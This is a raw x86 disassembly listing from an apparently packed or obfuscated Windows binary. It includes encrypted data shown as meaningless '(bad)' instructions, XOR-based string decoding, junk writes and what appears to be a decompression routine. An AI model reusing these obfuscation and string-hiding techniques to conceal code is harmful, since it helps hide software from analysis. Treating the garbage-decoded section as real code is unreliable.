  4256e7:	mov    edx,DWORD PTR [esi+esi*1+0x132ed03a]
  4256ee:	(bad)  
  4256ef:	or     ch,bl
  4256f1:	aad    0x64
  4256f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256f4:	rcr    BYTE PTR [edi+0xe550470],cl
  4256fa:	mov    dh,0x6c
  4256fc:	shl    BYTE PTR [ebp-0x6f],1
  4256ff:	xchg   edi,eax
  425700:	test   eax,0x197f8102
  425705:	sahf   
  425706:	fcmovbe st,st(4)
  425708:	ja     0x4256e0
  42570a:	(bad)  
  42570c:	mov    ds:0x7623d721,eax
  425711:	jo     0x4256d9
  425713:	or     ecx,DWORD PTR [edx-0x58babdb2]
  425719:	cmp    BYTE PTR [ebp+0x2],al
  42571c:	fcmovb st,st(3)
  42571e:	ss cwde 
  425720:	sub    BYTE PTR [edi],bh
  425722:	in     eax,dx
  425723:	cdq    
  425724:	scas   al,BYTE PTR es:[edi]
  425725:	xor    edi,ebp
  425727:	jle    0x42579b
  425729:	jae    0x4256bc
  42572b:	jp     0x4257a9
  42572d:	aad    0x69
  42572f:	ret    0x517f
  425732:	push   ss
  425733:	xor    al,0x1c
  425735:	ss pop ebp
  425737:	and    eax,0x1e056083
  42573c:	adc    al,0xa5
  42573e:	mov    ds:0xc00684e1,eax
  425743:	bound  edx,QWORD PTR [eax-0x13]
  425746:	or     al,0xc0
  425748:	imul   ecx,esi,0xffffffa8
  42574b:	call   eax
  42574d:	clc    
  42574e:	fdivrp st(4),st
  425750:	ins    DWORD PTR es:[edi],dx
  425751:	inc    esi
  425752:	test   al,0xf5
  425754:	cmc    
  425755:	sbb    dl,dh
  425757:	ss aas 
  425759:	hlt    
  42575a:	sbb    ch,BYTE PTR [esp+ecx*2+0xb]
  42575e:	test   DWORD PTR [edx+0xe6dd935],eax
  425764:	sbb    al,0x9
  425766:	and    BYTE PTR [esi-0x422b5a61],0xde
  42576d:	sbb    bl,ch
  42576f:	stc    
  425770:	dec    edx
  425771:	xor    dh,BYTE PTR ds:0x521ecd47
  425777:	adc    bh,bh
  425779:	test   ecx,edi
  42577b:	retf   
  42577c:	cwde   
  42577d:	jg     0x4257bd
  42577f:	(bad)  
  425781:	scas   al,BYTE PTR es:[edi]
  425782:	out    0xf9,eax
  425784:	cmp    edx,esp
  425786:	test   al,0xea
  425788:	fs mov cl,0xab
  42578b:	pop    ebx
  42578c:	imul   DWORD PTR [esi+0x1861d50f]
  425792:	pop    eax
  425793:	ror    BYTE PTR [ebx+0x7cba206f],0xe8
  42579a:	sbb    esi,ebx
  42579c:	(bad)  
  42579d:	jge    0x42578d
  42579f:	mov    ebp,DWORD PTR [edi+0xe]
  4257a2:	jno    0x425816
  4257a4:	xchg   ecx,eax
  4257a5:	pop    es
  4257a6:	mov    edi,0xd9a9cf38
  4257ab:	imul   edx,DWORD PTR [edi*4-0x7c58d7a0],0x2313a4a3
  4257b6:	and    al,0x27
  4257b8:	addr16 xchg edi,eax
  4257ba:	inc    ebp
  4257bb:	jnp    0x4257e8
  4257bd:	inc    esp
  4257be:	xor    ch,cl
  4257c0:	dec    ebx
  4257c1:	xor    esp,DWORD PTR ds:0xc7cab8d8
  4257c7:	hlt    
  4257c8:	hlt    
  4257c9:	xchg   esp,eax
  4257ca:	not    BYTE PTR [ecx+edx*4+0x557b6187]
  4257d1:	add    ch,bh
  4257d3:	push   edx
  4257d4:	mov    ebx,eax
  4257d6:	or     ebx,0x55
  4257d9:	fnstsw WORD PTR [ebp+0x30]
  4257dc:	dec    edi
  4257dd:	into   
  4257de:	retf   0xbf81
  4257e1:	sub    BYTE PTR [ebx-0x2b],bl
  4257e4:	shr    DWORD PTR fs:[edx+0x29],1
  4257e8:	jnp    0x4257e8
  4257ea:	xchg   esp,eax
  4257eb:	push   ecx
  4257ec:	retf   
  4257ed:	lods   al,BYTE PTR ds:[esi]
  4257ee:	pop    edi
  4257ef:	mov    eax,0xcb704248
  4257f4:	nop
  4257f5:	push   edi
  4257f6:	xchg   ecx,eax
  4257f7:	xchg   esp,eax
  4257f8:	push   ds
  4257f9:	add    esi,DWORD PTR [ecx+0x2e]
  4257fc:	add    al,0x55
  4257fe:	jp     0x425819
  425800:	(bad)  
  425801:	cwde   
  425802:	pop    edx
  425803:	enter  0xb459,0x4a
  425807:	add    DWORD PTR [eax-0x30294490],esi
  42580d:	mov    DWORD PTR [ebx+0x32fadd9c],ecx
  425813:	mov    cl,0xd2
  425815:	and    ebx,esi
  425817:	sub    edx,DWORD PTR [ecx]
  425819:	(bad)  
  42581a:	push   esi
  42581b:	call   0xaf5b0ba6
  425820:	mov    ebx,DWORD PTR [ecx]
  425822:	ficom  DWORD PTR [ebp+edi*1-0xa]
  425826:	xlat   BYTE PTR ds:[ebx]
  425827:	fst    DWORD PTR [eax+ecx*1]
  42582a:	imul   esi,DWORD PTR [ebx-0x27],0xffffffe6
  42582e:	adc    al,0x43
  425830:	or     BYTE PTR [ebp+0x1e],0x3c
  425834:	adc    al,0xe9
  425837:	jbe    0x425862
  425839:	jmp    0x42588a
  42583b:	mov    al,0x36
  42583d:	adc    eax,0xd3675f84
  425842:	sti    
  425843:	ror    BYTE PTR [eax+0x5a],cl
  425846:	mov    dl,0xae
  425848:	push   ebp
  425849:	dec    ecx
  42584a:	xor    BYTE PTR [edi+0x61bdaa1e],bl
  425850:	pop    eax
  425851:	inc    eax
  425852:	push   ebp
  425853:	dec    ecx
  425854:	xor    al,0x29
  425856:	scas   eax,DWORD PTR es:[edi]
  425857:	imul   ebx,DWORD PTR [ebx-0x11],0x8cfc0c7
  42585e:	imul   esi,DWORD PTR [ecx+0x253cbc05],0x4e
  425865:	sbb    eax,0xc3222c9c
  42586a:	xchg   ebp,eax
  42586b:	jmp    0x425856
  42586d:	mov    dl,0x75
  42586f:	mov    cl,0x83
  425871:	dec    esi
  425872:	sahf   
  425873:	inc    esp
  425874:	out    dx,al
  425875:	fidiv  DWORD PTR [eax-0x1f]
  425878:	test   DWORD PTR [ecx-0x4e226f2b],edx
  42587e:	leave  
  42587f:	dec    esi
  425880:	fs scas al,BYTE PTR es:[edi]
  425882:	mov    ds:0x425ae114,al
  425887:	pop    ebx
  425888:	xlat   BYTE PTR ds:[ebx]
  425889:	jle    0x4258b7
  42588b:	es (bad) 
  42588d:	aad    0xb9
  42588f:	aad    0x4e
  425891:	aaa    
  425892:	and    edx,DWORD PTR [eax-0x1a]
  425895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425896:	mov    ds:0xdc3b8595,eax
  42589b:	fwait
  42589c:	rcl    BYTE PTR [edx+0x7e],cl
  42589f:	inc    eax
  4258a0:	inc    esi
  4258a1:	stos   DWORD PTR es:[edi],eax
  4258a2:	mov    WORD PTR [ebp-0x26],ds
  4258a5:	lea    edi,[ebp+eiz*1+0x3]
  4258a9:	js     0x425878
  4258ab:	lock fst DWORD PTR cs:[eax]
  4258af:	adc    ebx,DWORD PTR [ecx+0x13]
  4258b2:	hlt    
  4258b3:	aam    0x3b
  4258b5:	clc    
  4258b6:	je     0x42590b
  4258bc:	mov    DWORD PTR [ebp-0xc],esi
  4258bf:	mov    eax,DWORD PTR [ebp-0xc]
  4258c2:	mov    esi,DWORD PTR [ebp+0xc]
  4258c5:	xor    eax,ecx
  4258c7:	lea    eax,[eax*8+0x1939820]
  4258ce:	mov    eax,DWORD PTR [esi+eax*1]
  4258d1:	mov    DWORD PTR [ebp+0xc],eax
  4258d4:	mov    eax,DWORD PTR [ebp-0x4]
  4258d7:	mov    esi,DWORD PTR [ebp-0x8]
  4258da:	xor    eax,ecx
  4258dc:	xor    esi,ecx
  4258de:	add    esi,edx
  4258e0:	add    eax,edx
  4258e2:	imul   eax,esi
  4258e5:	mov    esi,DWORD PTR [ebp+0xc]
  4258e8:	cmp    esi,eax
  4258ea:	je     0x42590b
  4258f0:	mov    eax,DWORD PTR [ebp-0x4]
  4258f3:	xor    eax,ecx
  4258f5:	mov    ecx,DWORD PTR [ebp+0xc]
  4258f8:	add    eax,edx
  4258fa:	imul   eax,ecx
  4258fd:	add    eax,DWORD PTR [ebp+0x8]
  425900:	mov    DWORD PTR [ebp+0xc],eax
  425903:	mov    eax,DWORD PTR [ebp+0xc]
  425906:	jmp    0x42591c
  42590b:	mov    eax,DWORD PTR [ebp-0x4]
  42590e:	mov    esi,DWORD PTR [ebp-0x8]
  425911:	xor    esi,ecx
  425913:	xor    eax,ecx
  425915:	add    esi,edx
  425917:	add    eax,edx
  425919:	imul   eax,esi
  42591c:	pop    edi
  42591d:	pop    esi
  42591e:	leave  
  42591f:	ret    0x8
	...
  425932:	add    BYTE PTR [eax],al
  425934:	int3   
  425935:	cmp    al,0xf3
  425937:	dec    ebp
  425938:	add    BYTE PTR [eax],al
  42593a:	add    BYTE PTR [eax],al
  42593c:	add    al,BYTE PTR [eax]
  42593e:	add    BYTE PTR [eax],al
  425940:	add    BYTE PTR ss:[eax],al
  425943:	add    BYTE PTR [eax+0x59],dl
  425946:	add    al,BYTE PTR [eax]
  425948:	push   eax
  425949:	dec    ebp
  42594a:	add    al,BYTE PTR [eax]
  42594c:	add    BYTE PTR [eax],al
  42594e:	add    BYTE PTR [eax],al
  425950:	push   edx
  425951:	push   ebx
  425952:	inc    esp
  425953:	push   ebx
  425954:	enter  0xa314,0xe8
  425958:	arpl   WORD PTR [ebp-0x3e],si
  42595b:	inc    eax
  42595c:	mov    ch,0xae
  42595e:	sub    edx,DWORD PTR [ebx+edi*2+0x3a]
  425962:	repz jbe 0x425966
  425965:	add    BYTE PTR [eax],al
  425967:	add    BYTE PTR [edi+0x3a],al
  42596a:	pop    esp
  42596b:	push   ebx
  42596c:	jns    0x4259e1
  42596e:	and    BYTE PTR [ecx+ebp*2+0x72],al
  425972:	and    BYTE PTR [edi+0x69],dl
  425975:	outs   dx,BYTE PTR ds:[esi]
  425976:	pop    esp
  425977:	inc    esi
  425978:	imul   ebp,DWORD PTR [ebp+eiz*2+0x44],0x49617461
  425980:	outs   dx,BYTE PTR ds:[esi]
  425981:	jae    0x4259ec
  425983:	fs add BYTE PTR gs:[ebx-0x137e13ab],cl
  42598b:	or     BYTE PTR [ecx],al
  42598d:	add    BYTE PTR [eax],al
  42598f:	push   ebx
  425990:	mov    eax,ebx
  425992:	xchg   ecx,eax
  425993:	mov    eax,DWORD PTR [ebp+0x8]
  425996:	cmp    eax,0xf89c85a5
  42599b:	jne    0x425e5c
  4259a1:	mov    eax,DWORD PTR [ebp+0xc]
  4259a4:	cmp    eax,0xf89c85a2
  4259a9:	jne    0x425e5c
  4259af:	mov    eax,DWORD PTR [ebp+0x24]
  4259b2:	mov    DWORD PTR [ebp-0x4],eax
  4259b5:	mov    eax,DWORD PTR [ebp-0x4]
  4259b8:	mov    eax,DWORD PTR [eax+0x1d8]
  4259be:	mov    eax,DWORD PTR [eax]
  4259c0:	mov    eax,DWORD PTR [eax]
  4259c2:	mov    DWORD PTR [ebp-0x8],eax
  4259c5:	mov    BYTE PTR [ebp-0x18],0x1a
  4259c9:	mov    BYTE PTR [ebp-0x17],0x1f
  4259cd:	mov    BYTE PTR [ebp-0x16],0x18
  4259d1:	mov    BYTE PTR [ebp-0x15],0x4e
  4259d5:	mov    BYTE PTR [ebp-0x14],0x51
  4259d9:	mov    BYTE PTR [ebp-0x13],0x83
  4259dd:	mov    BYTE PTR [ebp-0x20],0xc
  4259e1:	mov    BYTE PTR [ebp-0x1f],0xe
  4259e5:	mov    BYTE PTR [ebp-0x1e],0x1c
  4259e9:	mov    BYTE PTR [ebp-0x1d],0x11
  4259ed:	mov    BYTE PTR [ebp-0x1c],0x4e
  4259f1:	mov    BYTE PTR [ebp-0x1b],0x51
  4259f5:	mov    BYTE PTR [ebp-0x1a],0x83
  4259f9:	mov    BYTE PTR [ebp-0x28],0xe
  4259fd:	mov    BYTE PTR [ebp-0x27],0x1b
  425a01:	mov    BYTE PTR [ebp-0x26],0x17
  425a05:	mov    BYTE PTR [ebp-0x25],0xa
  425a09:	mov    BYTE PTR [ebp-0x24],0x20
  425a0d:	mov    BYTE PTR [ebp-0x23],0x13
  425a11:	mov    BYTE PTR [ebp-0x22],0x18
  425a15:	mov    BYTE PTR [ebp-0x21],0x83
  425a19:	xor    ecx,ecx
  425a1b:	lea    eax,[ebp+ecx*1-0x18]
  425a1f:	movzx  edx,BYTE PTR [eax]
  425a22:	xor    edx,0x7e
  425a25:	add    edx,0x3
  425a28:	inc    ecx
  425a29:	mov    BYTE PTR [eax],dl
  425a2b:	cmp    ecx,0x6
  425a2e:	jb     0x425a1b
  425a30:	xor    ecx,ecx
  425a32:	lea    eax,[ebp+ecx*1-0x20]
  425a36:	movzx  edx,BYTE PTR [eax]
  425a39:	xor    edx,0x7e
  425a3c:	add    edx,0x3
  425a3f:	inc    ecx
  425a40:	mov    BYTE PTR [eax],dl
  425a42:	cmp    ecx,0x7
  425a45:	jb     0x425a32
  425a47:	xor    ecx,ecx
  425a49:	lea    eax,[ebp+ecx*1-0x28]
  425a4d:	movzx  edx,BYTE PTR [eax]
  425a50:	xor    edx,0x7e
  425a53:	add    edx,0x3
  425a56:	inc    ecx
  425a57:	mov    BYTE PTR [eax],dl
  425a59:	cmp    ecx,0x8
  425a5c:	jb     0x425a49
  425a5e:	lea    eax,[ebp-0x2c]
  425a61:	mov    DWORD PTR [ebp-0x8],eax
  425a64:	mov    ecx,DWORD PTR [ebp-0x8]
  425a67:	mov    eax,0x7113fccf
  425a6c:	mov    DWORD PTR [ecx],eax
  425a6e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425a71:	push   esi
  425a72:	push   edi
  425a73:	mov    esi,0x4e3e
  425a78:	mov    ebx,0x3272f5
  425a7d:	cmp    ecx,eax
  425a7f:	jne    0x425b4a
  425a85:	lea    eax,[esi+0x39]
  425a88:	mov    WORD PTR [ebp-0x78],ax
  425a8c:	mov    eax,esi
  425a8e:	mov    WORD PTR [ebp-0x76],ax
  425a92:	add    eax,0x3f
  425a95:	mov    WORD PTR [ebp-0x74],ax
  425a99:	lea    eax,[esi-0x2]
  425a9c:	mov    WORD PTR [ebp-0x72],ax
  425aa0:	add    eax,0x43
  425aa3:	mov    ecx,eax
  425aa5:	lea    eax,[esi-0x9]
  425aa8:	mov    WORD PTR [ebp-0x66],ax
  425aac:	mov    eax,esi
  425aae:	mov    WORD PTR [ebp-0x64],ax
  425ab2:	add    eax,0xffffffec
  425ab5:	mov    WORD PTR [ebp-0x62],ax
  425ab9:	mov    eax,0x443
  425abe:	mov    WORD PTR [ebp-0x60],ax
  425ac2:	mov    eax,0x5670
  425ac7:	mov    WORD PTR [ebp-0x5e],ax
  425acb:	mov    eax,0x6110
  425ad0:	mov    WORD PTR [ebp-0x5c],ax
  425ad4:	lea    eax,[ebp-0xe0]
  425ada:	push   eax
  425adb:	mov    eax,DWORD PTR [ebp+0xc]
  425ade:	mov    edi,0x75108ae
  425ae3:	xor    eax,edi
  425ae5:	add    eax,ebx
  425ae7:	push   eax
  425ae8:	mov    WORD PTR [ebp-0x70],cx
  425aec:	lea    ecx,[esi-0xe]
  425aef:	mov    edx,ecx
  425af1:	lea    eax,[ebp-0x78]
  425af4:	push   eax
  425af5:	mov    eax,DWORD PTR [ebp-0x4]
  425af8:	mov    eax,DWORD PTR [eax+0x198]
  425afe:	mov    WORD PTR [ebp-0x6e],dx
  425b02:	mov    edx,0x4f8a
  425b07:	mov    WORD PTR [ebp-0x6c],dx
  425b0b:	mov    DWORD PTR [ebp-0x6a],0x4e7f4e31
  425b12:	mov    DWORD PTR [ebp-0x5a],0x4e30f1e6
  425b19:	mov    DWORD PTR [ebp-0xe0],0x1
  425b23:	mov    DWORD PTR [ebp-0xdc],0x255
  425b2d:	push   DWORD PTR [eax]
  425b2f:	mov    eax,DWORD PTR [ebp+0x10]
  425b32:	call   eax
  425b34:	mov    DWORD PTR [ebp-0x8],eax
  425b37:	mov    eax,DWORD PTR [ebp-0x8]
  425b3a:	test   eax,eax
  425b3c:	je     0x425b4f
  425b3e:	xor    DWORD PTR ds:0x76586876,0x87687666
  425b48:	jmp    0x425b4f
  425b4a:	mov    edi,0x75108ae
  425b4f:	mov    eax,DWORD PTR [ebp-0x4]
  425b52:	mov    ecx,DWORD PTR [eax+0x18c]
  425b58:	xor    eax,eax
  425b5a:	cmp    DWORD PTR [ecx],eax
  425b5c:	jne    0x425dcf
  425b62:	mov    ecx,DWORD PTR [ebp-0x4]
  425b65:	mov    ecx,DWORD PTR [ecx+0x17c]
  425b6b:	mov    DWORD PTR [ecx],eax
  425b6d:	mov    ecx,DWORD PTR [ebp-0x4]
  425b70:	mov    ecx,DWORD PTR [ecx+0x180]
  425b76:	mov    DWORD PTR [ecx],eax
  425b78:	mov    eax,0x4e6d
  425b7d:	mov    WORD PTR [ebp-0x9c],ax
  425b84:	mov    eax,esi
  425b86:	mov    WORD PTR [ebp-0x9a],ax
  425b8d:	mov    eax,0x4e7d
  425b92:	mov    WORD PTR [ebp-0x98],ax
  425b99:	add    eax,0xffffffc0
  425b9c:	mov    WORD PTR [ebp-0x96],ax
  425ba3:	mov    eax,0x4f8e
  425ba8:	mov    WORD PTR [ebp-0x94],ax
  425baf:	mov    eax,0x4e32
  425bb4:	mov    WORD PTR [ebp-0x92],ax
  425bbb:	add    eax,0x4d
  425bbe:	mov    WORD PTR [ebp-0x90],ax
  425bc5:	mov    eax,0x4e30
  425bca:	mov    WORD PTR [ebp-0x8e],ax
  425bd1:	mov    eax,esi
  425bd3:	mov    WORD PTR [ebp-0x8c],ax
  425bda:	mov    eax,0x4e31
  425bdf:	mov    WORD PTR [ebp-0x8a],ax
  425be6:	mov    eax,0x99fd
  425beb:	mov    WORD PTR [ebp-0x88],ax
  425bf2:	mov    eax,0x8d62
  425bf7:	mov    WORD PTR [ebp-0x86],ax
  425bfe:	mov    eax,0xd66f
  425c03:	mov    WORD PTR [ebp-0x84],ax
  425c0a:	mov    eax,0xd783
  425c0f:	mov    WORD PTR [ebp-0x82],ax
  425c16:	mov    eax,0x2780
  425c1b:	mov    WORD PTR [ebp-0x80],ax
  425c1f:	mov    eax,0x4780
  425c24:	mov    WORD PTR [ebp-0x7e],ax
  425c28:	mov    eax,0x4e33
  425c2d:	push   0x8
  425c2f:	mov    WORD PTR [ebp-0x7c],ax
  425c33:	mov    DWORD PTR [ebp-0x10],0xa171b0e
  425c3a:	mov    DWORD PTR [ebp-0xc],0x83181320
  425c41:	lea    eax,[ebp-0x10]
  425c44:	pop    ecx
  425c45:	mov    dl,BYTE PTR [eax]
  425c47:	xor    dl,0x7e
  425c4a:	add    dl,0x3
  425c4d:	mov    BYTE PTR [eax],dl
  425c4f:	inc    eax
  425c50:	dec    ecx
  425c51:	jne    0x425c45
  425c53:	lea    eax,[ebp-0x10]
  425c56:	mov    DWORD PTR [ebp-0xdc],eax
  425c5c:	lea    eax,[ebp-0xe0]
  425c62:	push   eax
  425c63:	mov    eax,DWORD PTR [ebp+0xc]
  425c66:	xor    eax,edi
  425c68:	add    eax,ebx
  425c6a:	push   eax
  425c6b:	mov    eax,DWORD PTR [ebp-0x4]
  425c6e:	add    eax,0x66
  425c71:	push   eax
  425c72:	mov    eax,DWORD PTR [ebp-0x4]
  425c75:	mov    eax,DWORD PTR [eax+0x198]
  425c7b:	mov    DWORD PTR [ebp-0xe0],0x1
  425c85:	push   DWORD PTR [eax]
  425c87:	mov    eax,DWORD PTR [ebp+0x10]
  425c8a:	call   eax
  425c8c:	mov    ecx,DWORD PTR [ebp+0x8]
  425c8f:	xor    ecx,edi
  425c91:	add    ecx,ebx
  425c93:	mov    DWORD PTR [ebp-0x8],eax
  425c96:	cmp    eax,ecx
  425c98:	jne    0x425cb3
  425c9a:	mov    eax,ds:0x33730bcc
  425c9f:	or     eax,0x22150bcf
  425ca4:	mov    ds:0x33730bcc,eax
  425ca9:	add    eax,0x3372e92f
  425cae:	mov    ds:0x33730bcc,eax
  425cb3:	mov    ecx,0x4e66
  425cb8:	mov    eax,ecx
  425cba:	mov    WORD PTR [ebp-0x40],ax
  425cbe:	add    eax,0x5
  425cc1:	mov    edx,eax
  425cc3:	mov    WORD PTR [ebp-0x3e],dx
  425cc7:	mov    edx,0x4f93
  425ccc:	mov    WORD PTR [ebp-0x3c],dx
  425cd0:	add    edx,0xfffffff8
  425cd3:	mov    WORD PTR [ebp-0x3a],dx
  425cd7:	mov    edx,0x4f89
  425cdc:	mov    WORD PTR [ebp-0x38],dx
  425ce0:	add    edx,0x3
  425ce3:	mov    WORD PTR [ebp-0x36],dx
  425ce7:	mov    edx,0x4f87
  425cec:	mov    WORD PTR [ebp-0x34],dx
  425cf0:	mov    WORD PTR [ebp-0x32],cx
  425cf4:	mov    ecx,esi
  425cf6:	mov    WORD PTR [ebp-0x30],cx
  425cfa:	lea    ecx,[edx-0x1]
  425cfd:	mov    edx,ecx
  425cff:	mov    WORD PTR [ebp-0x54],dx
  425d03:	mov    edx,eax
  425d05:	mov    WORD PTR [ebp-0x52],dx
  425d09:	mov    edx,0x4e73
  425d0e:	mov    WORD PTR [ebp-0x50],dx
  425d12:	mov    WORD PTR [ebp-0x4e],ax
  425d16:	lea    eax,[edx-0xa]
  425d19:	mov    WORD PTR [ebp-0x4c],ax
  425d1d:	add    eax,0x3
  425d20:	mov    WORD PTR [ebp-0x4a],ax
  425d24:	lea    eax,[edx-0xc]
  425d27:	mov    WORD PTR [ebp-0x48],ax
  425d2b:	mov    WORD PTR [ebp-0x46],cx
  425d2f:	mov    WORD PTR [ebp-0x44],si
  425d33:	mov    eax,DWORD PTR [ebp+0x8]
  425d36:	movzx  ecx,WORD PTR [ebp-0x54]
  425d3a:	xor    eax,edi
  425d3c:	add    eax,ebx
  425d3e:	xor    eax,ecx
  425d40:	mov    WORD PTR [ebp-0x54],ax
  425d44:	mov    eax,DWORD PTR [ebp+0x8]
  425d47:	movzx  ecx,WORD PTR [ebp-0x40]
  425d4b:	xor    eax,edi
  425d4d:	add    eax,ebx
  425d4f:	xor    eax,ecx
  425d51:	mov    WORD PTR [ebp-0x40],ax
  425d55:	xor    eax,eax
  425d57:	mov    WORD PTR [ebp-0xf4],ax
  425d5e:	mov    WORD PTR [ebp-0x108],ax
  425d65:	mov    edi,DWORD PTR [ebp+0x24]
  425d68:	lea    eax,[ebp-0xf4]
  425d6e:	lea    edx,[ebp-0x54]
  425d71:	mov    DWORD PTR [ebp-0xe0],0x2
  425d7b:	mov    DWORD PTR [ebp-0xdc],eax
  425d81:	call   0x4287b9
  425d86:	mov    DWORD PTR [ebp-0xd8],eax
  425d8c:	lea    eax,[ebp-0xe0]
  425d92:	push   eax
  425d93:	mov    eax,DWORD PTR [ebp+0xc]
  425d96:	xor    eax,0x75108ae
  425d9b:	add    eax,ebx
  425d9d:	push   eax
  425d9e:	lea    eax,[ebp-0x9c]
  425da4:	push   eax
  425da5:	push   DWORD PTR [ebp-0x8]
  425da8:	mov    eax,DWORD PTR [ebp+0x10]
  425dab:	call   eax
  425dad:	mov    edi,DWORD PTR [ebp+0x24]
  425db0:	lea    eax,[ebp-0x108]
  425db6:	lea    edx,[ebp-0x40]
  425db9:	mov    DWORD PTR [ebp-0xdc],eax
  425dbf:	call   0x4287b9
  425dc4:	mov    DWORD PTR [ebp-0xd8],eax
  425dca:	mov    edi,0x75108ae
  425dcf:	mov    eax,DWORD PTR [ebp+0x14]
  425dd2:	push   DWORD PTR [ebp-0x4]
  425dd5:	push   DWORD PTR [ebp+0x20]
  425dd8:	push   DWORD PTR [ebp+0x1c]
  425ddb:	push   DWORD PTR [ebp+0x18]
  425dde:	push   DWORD PTR [ebp+0x10]
  425de1:	push   DWORD PTR [ebp+0x8]
  425de4:	push   DWORD PTR [ebp+0xc]
  425de7:	call   0x42705a
  425dec:	test   eax,eax
  425dee:	je     0x425e32
  425df0:	add    DWORD PTR [ebp-0x4],eax
  425df3:	push   DWORD PTR [ebp-0x4]
  425df6:	lea    esi,[ebp+0x4]
  425df9:	call   0x42624a
  425dfe:	mov    eax,DWORD PTR [ebp-0x4]
  425e01:	mov    eax,DWORD PTR [eax+0x1c8]
  425e07:	mov    eax,DWORD PTR [eax]
  425e09:	xor    eax,edi
  425e0b:	add    eax,ebx
  425e0d:	mov    eax,DWORD PTR [ebp-0x4]
  425e10:	jne    0x425e28
  425e12:	mov    ecx,DWORD PTR [ebp-0x4]
  425e15:	mov    ecx,DWORD PTR [ecx+0x1cc]
  425e1b:	push   DWORD PTR [ecx]
  425e1d:	mov    eax,DWORD PTR [eax+0x1e0]
  425e23:	call   DWORD PTR [eax+0x28]
  425e26:	jmp    0x425e32
  425e28:	mov    eax,DWORD PTR [eax+0x17c]
  425e2e:	mov    eax,DWORD PTR [eax]
  425e30:	add    DWORD PTR [esi],eax
  425e32:	mov    eax,DWORD PTR [ebp-0x4]
  425e35:	mov    eax,DWORD PTR [eax+0x1dc]
  425e3b:	dec    DWORD PTR [eax]
  425e3d:	mov    ecx,DWORD PTR [ebp-0x4]
  425e40:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425e46:	mov    eax,DWORD PTR [eax]
  425e48:	lea    eax,[ecx+eax*4]
  425e4b:	mov    ecx,DWORD PTR [ebp-0x4]
  425e4e:	mov    ecx,DWORD PTR [ecx+0x17c]
  425e54:	mov    eax,DWORD PTR [eax]
  425e56:	mov    ecx,DWORD PTR [ecx]
  425e58:	add    DWORD PTR [eax],ecx
  425e5a:	pop    edi
  425e5b:	pop    esi
  425e5c:	pop    ebx
  425e5d:	leave  
  425e5e:	ret    0x20
  425e61:	push   edi
  425e62:	push   esi
  425e63:	push   ebx
  425e64:	push   ebp
  425e65:	mov    ebp,esp
  425e67:	mov    eax,DWORD PTR [ebp+0x24]
  425e6a:	add    DWORD PTR [ebp+0x28],eax
  425e6d:	push   eax
  425e6e:	cld    
  425e6f:	mov    esi,DWORD PTR [ebp+0x18]
  425e72:	add    DWORD PTR [ebp+0x1c],esi
  425e75:	push   esi
  425e76:	mov    esi,DWORD PTR [ebp+0x14]
  425e79:	lods   eax,DWORD PTR ds:[esi]
  425e7a:	xchg   edx,eax
  425e7b:	push   edx
  425e7c:	mov    cl,BYTE PTR [esi-0x2]
  425e7f:	or     eax,0xffffffff
  425e82:	shl    eax,cl
  425e84:	not    eax
  425e86:	push   eax
  425e87:	mov    cl,dh
  425e89:	or     eax,0xffffffff
  425e8c:	shl    eax,cl
  425e8e:	not    eax
  425e90:	push   eax
  425e91:	add    cl,dl
  425e93:	mov    edi,esi
  425e95:	sub    esp,0xc
  425e98:	sub    eax,eax
  425e9a:	inc    eax
  425e9b:	push   eax
  425e9c:	push   eax
  425e9d:	push   eax
  425e9e:	push   eax
  425e9f:	push   eax
  425ea0:	push   edi
  425ea1:	sub    esi,esi
  425ea3:	push   esi
  425ea4:	or     ebx,0xffffffff
  425ea7:	mov    eax,0x300
  425eac:	shl    eax,cl
  425eae:	lea    ecx,[eax+0x736]
  425eb4:	mov    eax,0x4000400
  425eb9:	shr    ecx,1
  425ebb:	rep stos DWORD PTR es:[edi],eax
  425ebd:	push   0x5
  425ebf:	pop    ecx
  425ec0:	call   0x4261ab
  425ec5:	loop   0x425ec0
  425ec7:	lea    esi,[esi]
  425ec9:	lea    edi,[edi]
  425ecb:	mov    edi,DWORD PTR [ebp-0x4]
  425ece:	mov    eax,DWORD PTR [ebp-0x10]
  425ed1:	sub    edi,DWORD PTR [ebp+0x24]
  425ed4:	and    eax,edi
  425ed6:	mov    DWORD PTR [ebp-0x18],eax
  425ed9:	mov    al,0x0
  425edb:	call   0x4261c3
  425ee0:	jne    0x425f7b
  425ee6:	mov    cl,BYTE PTR [ebp-0xc]
  425ee9:	and    edi,DWORD PTR [ebp-0x14]
  425eec:	shl    edi,cl
  425eee:	sub    cl,0x8
  425ef1:	neg    cl
  425ef3:	shr    esi,cl
  425ef5:	pop    eax
  425ef6:	add    edi,esi
  425ef8:	pop    esi
  425ef9:	lea    edi,[edi+edi*2]
  425efc:	shl    edi,0x8
  425eff:	cmp    al,0x7
  425f01:	pop    edx
  425f02:	lea    ecx,[esi+edi*2+0xe6c]
  425f09:	push   ecx
  425f0a:	push   esi
  425f0b:	mov    esi,0x100
  425f10:	push   eax
  425f11:	mov    al,0x1
  425f13:	jb     0x425f49
  425f15:	mov    edi,DWORD PTR [ebp-0x4]
  425f18:	sub    edi,DWORD PTR [ebp-0x24]
  425f1b:	movzx  edi,BYTE PTR [edi]
  425f1e:	mov    ebp,DWORD PTR [ebp-0x34]
  425f21:	shl    edi,1
  425f23:	mov    ecx,esi
  425f25:	and    esi,edi
  425f27:	add    ecx,esi
  425f29:	lea    ebp,[ebp+ecx*2+0x0]
  425f2d:	call   0x4261e2
  425f32:	mov    ecx,eax
  425f34:	shr    esi,0x8
  425f37:	and    ecx,0x1
  425f3a:	cmp    esi,ecx
  425f3c:	mov    esi,0x100
  425f41:	jne    0x425f51
  425f43:	cmp    eax,esi
  425f45:	jb     0x425f1e
  425f47:	jmp    0x425f5d
  425f49:	mov    ebp,DWORD PTR [ebp-0x34]
  425f4c:	call   0x4261e2
  425f51:	inc    eax
  425f52:	inc    esi
  425f53:	sub    eax,0x1
  425f56:	sub    esi,0x1
  425f59:	cmp    eax,esi
  425f5b:	jb     0x425f49
  425f5d:	pop    edx
  425f5e:	inc    edx
  425f5f:	cmp    edx,0x5
  425f62:	dec    edx
  425f63:	mov    ecx,edx
  425f65:	jb     0x425f76
  425f67:	inc    edx
  425f68:	cmp    edx,0xb
  425f6b:	dec    edx
  425f6c:	mov    cl,0x4
  425f6e:	dec    cl
  425f70:	jb     0x425f76
  425f72:	mov    cl,0x7
  425f74:	dec    cl
  425f76:	sub    edx,ecx
  425f78:	push   edx
